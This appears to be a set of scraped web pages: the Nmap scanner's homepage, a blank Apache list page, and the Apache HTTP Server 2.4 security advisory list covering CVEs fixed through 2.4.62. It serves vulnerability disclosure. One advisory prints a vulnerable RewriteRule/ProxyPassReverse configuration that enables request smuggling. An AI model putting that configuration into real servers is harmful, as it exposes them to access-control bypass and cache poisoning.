Security Scanner version 5.00](/5/). Don't miss the [top 5 improvements in Nmap 5](/5/#5changes).* After years of effort, we are delighted to release [Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning](/book/)!* We now have an active Nmap [Facebook page](http://facebook.com/nmap) and [Twitter feed](http://twitter.com/nmap/) to augment the [mailing lists](#lists). All of these options offer RSS feeds as well.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from lists.apache.org_5c66d9d2_20250125_143744.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from httpd.apache.org_e52639eb_20250125_143704.html ===

[![](/images/httpd_logo_wide_new.png)](/)
[![](https://www.apache.org/images/SupportApache-small.png)](https://www.apache.org/foundation/contributing.html)

# Essentials[¶](#essentials "Permanent link")

* [Download!](/download.cgi)
* [About](/ABOUT_APACHE.html)
* [License](https://www.apache.org/licenses/)
* [FAQ](https://wiki.apache.org/httpd/FAQ)
* [Security Reports](/security_report.html)

# Source Repositories[¶](#source-repositories "Permanent link")

* [General Information](/dev/devnotes.html)
* [Trunk](https://svn.apache.org/viewvc/httpd/httpd/trunk/)
* [2.4](https://svn.apache.org/viewvc/httpd/httpd/branches/2.4.x/)

# [Documentation](/docs/)[¶](#documentation "Permanent link")

* [Version 2.4](/docs/2.4/)
* [Trunk (dev)](/docs/trunk/)
* [Wiki](https://wiki.apache.org/httpd/)

# [Get Involved](/contribute/)[¶](#get-involved "Permanent link")

* [Mailing Lists](/lists.html)
* [Bug Reports](/bug_report.html)
* [Developer Info](/dev/)
* [User Support](/support.html)

# Subprojects[¶](#subprojects "Permanent link")

* [Docs](/docs-project/)
* [Test](/test/)
* [Flood](/test/flood/)
* [libapreq](/apreq/)
* [Modules](/modules)
* [mod\_fcgid](/mod_fcgid/)
* [mod\_ftp](/mod_ftp/)

# Related Projects[¶](#related-projects "Permanent link")

* [Apache Traffic Server](https://trafficserver.apache.org/)
* [Apache Traffic Control](https://trafficcontrol.apache.org/)
* [Tomcat](https://tomcat.apache.org/)
* [APR](https://apr.apache.org/)
* [mod\_perl](https://perl.apache.org/)

# [Miscellaneous](/info/)[¶](#miscellaneous "Permanent link")

* [Contributors](/contributors/)
* [Thanks!](https://www.apache.org/foundation/thanks.html)
* [Sponsorship](https://www.apache.org/foundation/sponsorship.html)

# Apache HTTP Server 2.4 vulnerabilities

This page lists all security vulnerabilities fixed in released versions of Apache HTTP Server 2.4. Each vulnerability is given a security [impact rating](/security/impact_levels.html) by the Apache security team - please note that this rating may well vary from platform to platform. We also list the versions the flaw is known to affect, and where a flaw has not been verified list the version with a question mark.

Please note that if a vulnerability is shown below as being fixed in a "-dev" release then this means that a fix has been applied to the development source tree and will be part of an upcoming full release.

Please send comments or corrections for these vulnerabilities to the [Security Team](/security_report.html).

*The initial GA release, Apache httpd 2.4.1, includes fixes for all vulnerabilities which have been resolved in Apache httpd 2.2.22 and all older releases. Consult the [Apache httpd 2.2 vulnerabilities list](vulnerabilities_22.html) for more information.*

# Fixed in Apache HTTP Server 2.4.62

### important: Apache HTTP Server: source code disclosure with handlers configured via AddType ([CVE-2024-40725](https://www.cve.org/CVERecord?id=CVE-2024-40725))

A partial fix for CVE-2024-39884 in the core of Apache HTTP Server 2.4.61 ignores some use of the legacy content-type based configuration of handlers. "AddType" and similar configuration, under some circumstances where files are requested indirectly, result in source code disclosure of local content. For example, PHP scripts may be served instead of interpreted.

Users are recommended to upgrade to version 2.4.62, which fixes this issue.

| Reported to security team | 2024-07-09 |
| --- | --- |
| fixed by r1919249 in 2.4.x | 2024-07-15 |
| Update 2.4.62 released | 2024-07-17 |
| Affects | 2.4.60 through 2.4.61 |

### important: Apache HTTP Server: SSRF with mod\_rewrite in server/vhost context on Windows ([CVE-2024-40898](https://www.cve.org/CVERecord?id=CVE-2024-40898))

SSRF in Apache HTTP Server on Windows with mod\_rewrite in server/vhost context, allows to potentially leak NTLM hashes to a malicious server via SSRF and malicious requests.

Users are recommended to upgrade to version 2.4.62 which fixes this issue.

Acknowledgements:

* finder: Smi1e (DBAPPSecurity Ltd.)
* finder: xiaojunjie (DBAPPSecurity Ltd.)

| Reported to security team | 2024-07-12 |
| --- | --- |
| fixed by r1919248 in 2.4.x | 2024-07-15 |
| Update 2.4.62 released | 2024-07-17 |
| Affects | 2.4.0 through 2.4.61 |

# Fixed in Apache HTTP Server 2.4.61

### important: Apache HTTP Server: source code disclosure with handlers configured via AddType ([CVE-2024-39884](https://www.cve.org/CVERecord?id=CVE-2024-39884))

A regression in the core of Apache HTTP Server 2.4.60 ignores some use of the legacy content-type based configuration of handlers. "AddType" and similar configuration, under some circumstances where files are requested indirectly, result in source code disclosure of local content. For example, PHP scripts may be served instead of interpreted.

Users are recommended to upgrade to version 2.4.61, which fixes this issue.

| Reported to security team | 2024-07-01 |
| --- | --- |
| fixed by r1918839 in 2.4.x | 2024-07-03 |
| Update 2.4.61 released | 2024-07-03 |
| Affects | 2.4.60 |

# Fixed in Apache HTTP Server 2.4.60

### low: Apache HTTP Server: DoS by Null pointer in websocket over HTTP/2 ([CVE-2024-36387](https://www.cve.org/CVERecord?id=CVE-2024-36387))

Serving WebSocket protocol upgrades over a HTTP/2 connection could result in a Null Pointer dereference, leading to a crash of the server process, degrading performance.

Acknowledgements: finder: Marc Stern (<marc.stern@approach-cyber.com>)

| fixed in r1918003 in trunk | 2024-05-27 |
| --- | --- |
| fixed by r1918557 in 2.4.x | 2024-07-01 |
| Update 2.4.60 released | 2024-07-01 |
| Affects | 2.4.55 through 2.4.59 |

### important: Apache HTTP Server on WIndows UNC SSRF ([CVE-2024-38472](https://www.cve.org/CVERecord?id=CVE-2024-38472))

SSRF in Apache HTTP Server on Windows allows to potentially leak NTLM hashes to a malicious server via SSRF and malicious requests or content

Users are recommended to upgrade to version 2.4.60 which fixes this issue. Note: Existing configurations that access UNC paths will have to configure new directive "UNCList" to allow access during request processing.

Acknowledgements: finder: Orange Tsai (@orange\_8361) from DEVCORE

| Reported to security team | 2024-04-01 |
| --- | --- |
| fixed by r1918558 in 2.4.x | 2024-07-01 |
| Update 2.4.60 released | 2024-07-01 |
| Affects | 2.4.0 through 2.4.59 |

### moderate: Apache HTTP Server proxy encoding problem ([CVE-2024-38473](https://www.cve.org/CVERecord?id=CVE-2024-38473))

Encoding problem in mod\_proxy in Apache HTTP Server 2.4.59 and earlier allows request URLs with incorrect encoding to be sent to backend services, potentially bypassing authentication via crafted requests. This affects configurations where mechanisms other than ProxyPass/ProxyPassMatch or RewriteRule with the 'P' flag are used to configure a request to be proxied, such as SetHandler or inadvertent proxying via CVE-2024-39573. Note that these alternate mechanisms may be used within .htaccess.

Users are recommended to upgrade to version 2.4.60, which fixes this issue.

Acknowledgements: finder: Orange Tsai (@orange\_8361) from DEVCORE

| Reported to security team | 2024-04-01 |
| --- | --- |
| fixed by r1918559, r1918666, r1918600, r1918625, r1918668 in 2.4.x | 2024-07-01 |
| Update 2.4.60 released | 2024-07-01 |
| Affects | 2.4.0 through 2.4.59 |

### important: Apache HTTP Server weakness with encoded question marks in backreferences ([CVE-2024-38474](https://www.cve.org/CVERecord?id=CVE-2024-38474))

Substitution encoding issue in mod\_rewrite in Apache HTTP Server 2.4.59 and earlier allows attacker to execute scripts in directories permitted by the configuration but not directly reachable by any URL or source disclosure of scripts meant to only to be executed as CGI.

Users are recommended to upgrade to version 2.4.60, which fixes this issue.

Some RewriteRules that capture and substitute unsafely will now fail unless rewrite flag "UnsafeAllow3F" is specified.

Acknowledgements: finder: Orange Tsai (@orange\_8361) from DEVCORE

| Reported to security team | 2024-04-01 |
| --- | --- |
| fixed by r1918561 in 2.4.x | 2024-07-01 |
| Update 2.4.60 released | 2024-07-01 |
| Affects | 2.4.0 through 2.4.59 |

### important: Apache HTTP Server weakness in mod\_rewrite when first segment of substitution matches filesystem path. ([CVE-2024-38475](https://www.cve.org/CVERecord?id=CVE-2024-38475))

Improper escaping of output in mod\_rewrite in Apache HTTP Server 2.4.59 and earlier allows an attacker to map URLs to filesystem locations that are permitted to be served by the server but are not intentionally/directly reachable by any URL, resulting in code execution or source code disclosure.

Substitutions in server context that use a backreferences or variables as the first segment of the substitution are affected. Some unsafe RewiteRules will be broken by this change and the rewrite flag "UnsafePrefixStat" can be used to opt back in once ensuring the substitution is appropriately constrained.

Acknowledgements: finder: Orange Tsai (@orange\_8361) from DEVCORE

| Reported to security team | 2024-04-01 |
| --- | --- |
| fixed by r1918561 in 2.4.x | 2024-07-01 |
| Update 2.4.60 released | 2024-07-01 |
| Affects | 2.4.0 through 2.4.59 |

### important: Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect ([CVE-2024-38476](https://www.cve.org/CVERecord?id=CVE-2024-38476))

Vulnerability in core of Apache HTTP Server 2.4.59 and earlier are vulnerably to information disclosure, SSRF or local script execution via backend applications whose response headers are malicious or exploitable.

Note: Some legacy uses of the 'AddType' directive to connect a request to a handler must be ported to 'SetHandler' after this fix.

Users are recommended to upgrade to version 2.4.60, which fixes this issue.

Acknowledgements: finder: Orange Tsai (@orange\_8361) from DEVCORE

| Reported to security team | 2024-04-01 |
| --- | --- |
| fixed by r1918560 in 2.4.x | 2024-07-01 |
| Update 2.4.60 released | 2024-07-01 |
| Affects | 2.4.0 through 2.4.59 |

### important: Apache HTTP Server: Crash resulting in Denial of Service in mod\_proxy via a malicious request ([CVE-2024-38477](https://www.cve.org/CVERecord?id=CVE-2024-38477))

null pointer dereference in mod\_proxy in Apache HTTP Server 2.4.59 and earlier allows an attacker to crash the server via a malicious request.

Users are recommended to upgrade to version 2.4.60, which fixes this issue.

Acknowledgements: finder: Orange Tsai (@orange\_8361) from DEVCORE

| Reported | 2024-04-01 |
| --- | --- |
| fixed by r1918607 in 2.4.x | 2024-07-01 |
| Update 2.4.60 released | 2024-07-01 |
| Affects | 2.4.0 through 2.4.59 |

### moderate: Apache HTTP Server: mod\_rewrite proxy handler substitution ([CVE-2024-39573](https://www.cve.org/CVERecord?id=CVE-2024-39573))

Potential SSRF in mod\_rewrite in Apache HTTP Server 2.4.59 and earlier allows an attacker to cause unsafe RewriteRules to unexpectedly setup URL's to be handled by mod\_proxy.

Users are recommended to upgrade to version 2.4.60, which fixes this issue.

Acknowledgements: finder: Orange Tsai (@orange\_8361) from DEVCORE

| Reported to security team | 2024-04-01 |
| --- | --- |
| Update 2.4.60 released | 2024-07-01 |
| Affects | 2.4.0 through 2.4.59 |

# Fixed in Apache HTTP Server 2.4.59

### moderate: Apache HTTP Server: HTTP response splitting ([CVE-2023-38709](https://www.cve.org/CVERecord?id=CVE-2023-38709))

Faulty input validation in the core of Apache allows malicious or exploitable backend/content generators to split HTTP responses.

This issue affects Apache HTTP Server: through 2.4.58.

Acknowledgements: finder: Orange Tsai (@orange\_8361) from DEVCORE

| Reported to security team | 2023-06-26 |
| --- | --- |
| Update 2.4.59 released | 2024-04-04 |
| Affects | through 2.4.58 |

### low: Apache HTTP Server: HTTP Response Splitting in multiple modules ([CVE-2024-24795](https://www.cve.org/CVERecord?id=CVE-2024-24795))

HTTP Response splitting in multiple modules in Apache HTTP Server allows an attacker that can inject malicious response headers into backend applications to cause an HTTP desynchronization attack.

Users are recommended to upgrade to version 2.4.59, which fixes this issue.

Acknowledgements:

* finder: Keran Mu, Tsinghua University and Zhongguancun Laboratory.
* finder: Jianjun Chen, Tsinghua University and Zhongguancun Laboratory.

| Reported to security team | 2023-09-06 |
| --- | --- |
| Update 2.4.59 released | 2024-04-04 |
| Affects | 2.4.0 through 2.4.58 |

### moderate: Apache HTTP Server: HTTP/2 DoS by memory exhaustion on endless continuation frames ([CVE-2024-27316](https://www.cve.org/CVERecord?id=CVE-2024-27316))

HTTP/2 incoming headers exceeding the limit are temporarily buffered in nghttp2 in order to generate an informative HTTP 413 response. If a client does not stop sending headers, this leads to memory exhaustion.

Acknowledgements: finder: Bartek Nowotarski (https://nowotarski.info/)

| Reported to security team | 2024-02-22 |
| --- | --- |
| Update 2.4.59 released | 2024-04-04 |
| Affects | 2.4.17 through 2.4.58 |

# Fixed in Apache HTTP Server 2.4.58

### low: mod\_macro buffer over-read ([CVE-2023-31122](https://www.cve.org/CVERecord?id=CVE-2023-31122))

Out-of-bounds Read vulnerability in mod\_macro of Apache HTTP Server.This issue affects Apache HTTP Server: through 2.4.57.

Acknowledgements: finder: David Shoon (github/davidshoon)

| Update 2.4.58 released | 2023-10-19 |
| --- | --- |
| Affects | through 2.4.57 |

### low: Apache HTTP Server: DoS in HTTP/2 with initial windows size 0 ([CVE-2023-43622](https://www.cve.org/CVERecord?id=CVE-2023-43622))

An attacker, opening a HTTP/2 connection with an initial window size of 0, was able to block handling of that connection indefinitely in Apache HTTP Server. This could be used to exhaust worker resources in the server, similar to the well known "slow loris" attack pattern.

This has been fixed in version 2.4.58, so that such connection are terminated properly after the configured connection timeout.

This issue affects Apache HTTP Server: from 2.4.55 through 2.4.57.

Users are recommended to upgrade to version 2.4.58, which fixes the issue.

Acknowledgements:

* finder: Prof. Sven Dietrich (City University of New York)
* finder: Isa Jafarov (City University of New York)
* finder: Prof. Heejo Lee (Korea University)
* finder: Choongin Lee (Korea University)

| Reported to security team | 2023-09-15 |
| --- | --- |
| Update 2.4.58 released | 2023-10-19 |
| Affects | 2.4.55 through 2.4.57 |

### moderate: Apache HTTP Server: HTTP/2 stream memory not reclaimed right away on RST ([CVE-2023-45802](https://www.cve.org/CVERecord?id=CVE-2023-45802))

When a HTTP/2 stream was reset (RST frame) by a client, there was a time window were the request's memory resources were not reclaimed immediately. Instead, de-allocation was deferred to connection close. A client could send new requests and resets, keeping the connection busy and open and causing the memory footprint to keep on growing. On connection close, all resources were reclaimed, but the process might run out of memory before that.

This was found by the reporter during testing of CVE-2023-44487 (HTTP/2 Rapid Reset Exploit) with their own test client. During "normal" HTTP/2 use, the probability to hit this bug is very low. The kept memory would not become noticeable before the connection closes or times out.

Users are recommended to upgrade to version 2.4.58, which fixes the issue.

Acknowledgements:

* finder: Will Dormann of Vul Labs
* finder: David Warren of Vul Labs

| Reported to security team | 2023-10-12 |
| --- | --- |
| Update 2.4.58 released | 2023-10-19 |
| Affects | 2.4.17 through 2.4.57 |

# Fixed in Apache HTTP Server 2.4.56

### important: HTTP request splitting with mod\_rewrite and mod\_proxy ([CVE-2023-25690](https://www.cve.org/CVERecord?id=CVE-2023-25690))

Some mod\_proxy configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack.

Configurations are affected when mod\_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target using variable substitution.

For example, something like:

RewriteEngine on

RewriteRule "^/here/(.\*)" "http://example.com:8080/elsewhere?$1"; [P]

ProxyPassReverse /here/ http://example.com:8080/

Request splitting/smuggling could result in bypass of access controls in the proxy server, proxying unintended URLs to existing origin servers, and cache poisoning.

Acknowledgements: finder: Lars Krapf of Adobe

| Reported to security team | 2023-02-02 |
| --- | --- |
| fixed by r1908095 in 2.4.x | 2023-03-07 |
| Update 2.4.56 released | 2023-03-07 |
| Affects | 2.4.0 through 2.4.55 |

### moderate: Apache HTTP Server: mod\_proxy\_uwsgi HTTP response splitting ([CVE-2023-27522](https://www.cve.org/CVERecord?id=CVE-2023-27522))

HTTP Response Smuggling vulnerability in Apache HTTP Server via mod\_proxy\_uwsgi. This issue affects Apache HTTP Server: from 2.4.30 through 2.4.55.

Special characters in the origin response header can truncate/split the response forwarded to the client.

Acknowledgements: finder: Dimas Fariski Setyawan Putra (nyxsorcerer)

| Reported to security team | 2023-01-29 |
| --- | --- |
| fixed by r1908094 in 2.4.x | 2023-03-07 |
| Update 2.4.56 released | 2023-03-07 |
| Affects | 2.4.30 through 2.4.55 |

# Fixed in Apache HTTP Server 2.4.55

### moderate: mod\_dav out of bounds read, or write of zero byte ([CVE-2006-20001](https://www.cve.org/CVERecord?id=CVE-2006-20001))

A carefully crafted If: request header can cause a memory read, or write of a single zero byte, in a pool (heap) memory location beyond the header value sent. This could cause the process to crash.

This issue affects Apache HTTP Server 2.4.54 and earlier.

| Described in first edition of "The Art of Software Security Assessment" | 2006-10-31 |
| --- | --- |
| Reported to security team | 2022-08-10 |
| Update 2.4.55 released | 2023-01-17 |
| Affects | 2.4 through 2.4.54 |

### moderate: Apache HTTP Server: mod\_proxy\_ajp Possible request smuggling ([CVE-2022-36760](https://www.cve.org/CVERecord?id=CVE-2022-36760))

Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling') vulnerability in mod\_proxy\_ajp of Apache HTTP Server allows an attacker to smuggle requests to the AJP server it forwards requests to. This issue affects Apache HTTP Server Apache HTTP Server 2.4 version 2.4.54 and prior versions.

Acknowledgements: finder: ZeddYu\_Lu from Qi'anxin Research Institute of Legendsec at Qi'anxin Group

| Reported to security team | 2022-07-12 |
| --- | --- |
| Update 2.4.55 released | 2023-01-17 |
| Affects | 2.4 through 2.4.54 |

### moderate: Apache HTTP Server: mod\_proxy prior to 2.4.55 allows a backend to trigger HTTP response splitting ([CVE-2022-37436](https://www.cve.org/CVERecord?id=CVE-2022-37436))

Prior to Apache HTTP Server 2.4.55, a malicious backend can cause the response headers to be truncated early, resulting in some headers being incorporated into the response body. If the later headers have any security purpose, they will not be interpreted by the client.

Acknowledgements: finder: Dimas Fariski Setyawan Putra (@nyxsorcerer)

| Reported to security team | 2022-07-14 |
| --- | --- |
| Update 2.4.55 released | 2023-01-17 |
| Affects | before 2.4.55 |

# Fixed in Apache HTTP Server 2.4.54

### moderate: mod\_proxy\_ajp: Possible request smuggling ([CVE-2022-26377](https://www.cve.org/CVERecord?id=CVE-2022-26377))

Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling') vulnerability in mod\_proxy\_ajp of Apache HTTP Server allows an attacker to smuggle requests to the AJP server it forwards requests to. This issue affects Apache HTTP Server Apache HTTP Server 2.4 version 2.4.53 and prior versions.

Acknowledgements: Ricter Z @ 360 Noah Lab

| Reported to security team | 2022-03-02 |
| --- | --- |
| Update 2.4.54 released | 2022-06-08 |
| Affects | <=2.4.53 |

### low: read beyond bounds in mod\_isapi ([CVE-2022-28330](https://www.cve.org/CVERecord?id=CVE-2022-28330))

Apache HTTP Server 2.4.53 and earlier on Windows may read beyond bounds when configured to process requests with the mod\_isapi module.

Acknowledgements: The Apache HTTP Server project would like to thank Ronald Crane (Zippenhop LLC) for reporting this issue

| Update 2.4.54 released | 2022-06-08 |
| --- | --- |
| Affects | <=2.4.53 |

### low: read beyond bounds via ap\_rwrite() ([CVE-2022-28614](https://www.cve.org/CVERecord?id=CVE-2022-28614))

The ap\_rwrite() function in Apache HTTP Server 2.4.53 and earlier may read unintended memory if an attacker can cause the server to reflect very large input using ap\_rwrite() or ap\_rputs(), such as with mod\_luas r:puts() function.

Modules compiled and distributed separately from Apache HTTP Server that use the "ap\_rputs" function and may pass it a very large (INT\_MAX or larger) string must be compiled against current headers to resolve the issue.

Acknowledgements: The Apache HTTP Server project would like to thank Ronald Crane (Zippenhop LLC) for reporting this issue

| Update released in 2.4.54 | 2022-06-08 |
| --- | --- |
| Affects | <=2.4.53 |

### low: Read beyond bounds in ap\_strcmp\_match() ([CVE-2022-28615](https://www.cve.org/CVERecord?id=CVE-2022-28615))

Apache HTTP Server 2.4.53 and earlier may crash or disclose information due to a read beyond bounds in ap\_strcmp\_match() when provided with an extremely large input buffer. While no code distributed with the server can be coerced into such a call, third-party modules or lua scripts that use ap\_strcmp\_match() may hypothetically be affected.

Acknowledgements: The Apache HTTP Server project would like to thank Ronald Crane (Zippenhop LLC) for reporting this issue

| Update 2.4.54 released | 2022-06-08 |
| --- | --- |
| Affects | <=2.4.53 |

### low: Denial of service in mod\_lua r:parsebody ([CVE-2022-29404](https://www.cve.org/CVERecord?id=CVE-2022-29404))

In Apache HTTP Server 2.4.53 and earlier, a malicious request to a lua script that calls r:parsebody(0) may cause a denial of service due to no default limit on possible input size.

Acknowledgements: The Apache HTTP Server project would like to thank Ronald Crane (Zippenhop LLC) for reporting this issue

| Update 2.4.54 released | 2022-06-08 |
| --- | --- |
| Affects | <=2.4.53 |

### low: mod\_sed denial of service ([CVE-2022-30522](https://www.cve.org/CVERecord?id=CVE-2022-30522))

If Apache HTTP Server 2.4.53 is configured to do transformations with mod\_sed in contexts where the input to mod\_sed may be very large, mod\_sed may make excessively large memory allocations and trigger an abort.

Acknowledgements: This issue was found by Brian Moussalli from the JFrog Security Research team

| Update 2.4.54 released | 2022-06-08 |
| --- | --- |
| Affects | 2.4.53 |

### low: Information Disclosure in mod\_lua with websockets ([CVE-2022-30556](https://www.cve.org/CVERecord?id=CVE-2022-30556))

Apache HTTP Server 2.4.53 and earlier may return lengths to applications calling r:wsread() that point past the end of the storage allocated for the buffer.

Acknowledgements: The Apache HTTP Server project would like to thank Ronald Crane (Zippenhop LLC) for reporting this issue

| Update 2.4.54 released | 2022-06-08 |
| --- | --- |
| Affects | <=2.4.53 |

### low: mod\_proxy X-Forwarded-For dropped by hop-by-hop mechanism ([CVE-2022-31813](https://www.cve.org/CVERecord?id=CVE-2022-31813))

Apache HTTP Server 2.4.53 and earlier may not send the X-Forwarded-\* headers to the origin server based on client side Connection header hop-by-hop mechanism.

This may be used to bypass IP based authentication on the origin server/application.

Acknowledgements: The Apache HTTP Server project would like to thank Gaetan Ferry (Synacktiv) for reporting this issue

| Update 2.4.54 released | 2022-06-08 |
| --- | --- |
| Affects | <=2.4.53 |

# Fixed in Apache HTTP Server 2.4.53

### moderate: mod\_lua Use of uninitialized value of in r:parsebody ([CVE-2022-22719](https://www.cve.org/CVERecord?id=CVE-2022-22719))

A carefully crafted request body can cause a read to a random memory area which could cause the process to crash.

This issue affects Apache HTTP Server 2.4.52 and earlier.

Acknowledgements: Chamal De Silva

| Reported to security team | 2021-12-18 |
| --- | --- |
| fixed by r1898694 in 2.4.x | 2022-03-07 |
| Update 2.4.53 released | 2022-03-14 |
| Affects | <=2.4.52 |

### important: HTTP request smuggling vulnerability in Apache HTTP Server 2.4.52 and earlier ([CVE-2022-22720](https://www.cve.org/CVERecord?id=CVE-2022-22720))

Apache HTTP Server 2.4.52 and earlier fails to close inbound connection when errors are encountered discarding the request body, exposing the server to HTTP Request Smuggling

Acknowledgements: James Kettle <james.kettle portswigger.net>

| Reported to security team | 2021-12-17 |
| --- | --- |
| fixed by r1898692 in 2.4.x | 2022-03-07 |
| Update 2.4.53 released | 2022-03-14 |
| Affects | <=2.4.52 |

### low: core: Possible buffer overflow with very large or unlimited LimitXMLRequestBody ([CVE-2022-22721](https://www.cve.org/CVERecord?id=CVE-2022-22721))

If LimitXMLRequestBody is set to allow request bodies larger than 350MB (defaults to 1M) on 32 bit systems an integer overflow happens which later causes out of bounds writes.

This issue affects Apache HTTP Server 2.4.52 and earlier.

Acknowledgements: Anonymous working with Trend Micro Zero Day Initiative

| Reported to security team | 2021-12-16 |
| --- | --- |
| fixed by r1898693 in 2.4.x | 2022-03-07 |
| Update 2.4.53 released | 2022-03-14 |
| Affects | <=2.4.52 |

### important: mod\_sed: Read/write beyond bounds ([CVE-2022-23943](https://www.cve.org/CVERecord?id=CVE-2022-23943))

Out-of-bounds Write vulnerability in mod\_sed of Apache HTTP Server allows an attacker to overwrite heap memory with possibly attacker provided data.

This issue affects Apache HTTP Server 2.4 version 2.4.52 and prior versions.

Acknowledgements: Ronald Crane (Zippenhop LLC)

| Reported to security team | 2022-01-13 |
| --- | --- |
| fixed by r1898695, r1898772 in 2.4.x | 2022-03-09 |
| Update 2.4.53 released | 2022-03-14 |
| Affects | <=2.4.52 |

# Fixed in Apache HTTP Server 2.4.52

